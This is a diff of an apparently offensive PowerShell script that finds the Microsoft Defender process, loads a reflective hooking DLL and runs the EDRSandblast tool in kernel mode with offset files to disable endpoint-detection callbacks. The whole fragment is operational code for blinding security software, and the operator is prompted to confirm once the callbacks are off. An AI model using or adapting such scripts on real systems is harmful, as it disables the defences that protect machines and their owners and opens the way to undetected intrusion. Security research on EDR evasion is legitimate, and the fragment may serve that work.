@@ -6,8 +6,11 @@ $monitorDLL = "$rel\EDRReflectiveHooker.dll"
 $mdePID = (Get-Process -Name "MsMpEng").ID
 
 # disable callbacks
-$edrSandblast = "$root\helpers\EDRSandblast\EDRSandblast.exe"
-$edrSandblastArgs = "toggle_callbacks 0e1 --kernelmode -i"
+$edrs = "$root\helpers\EDRSandblast"
+$edrSandblast = "$edrs\EDRSandblast.exe"
+$ntO = "$edrs\offsets\NtoskrnlOffsets.csv"
+$fltO = "$edrs\offsets\FltmgrOffsets.csv"
+$edrSandblastArgs = "toggle_callbacks 0e1 --kernelmode --nt-offsets $ntO --fltmgr-offsets $fltO"
 Start-Process $edrSandblast -Args $edrSandblastArgs
 
 $_ = Read-Host "[*] Press ENTER when callbacks are disabled"
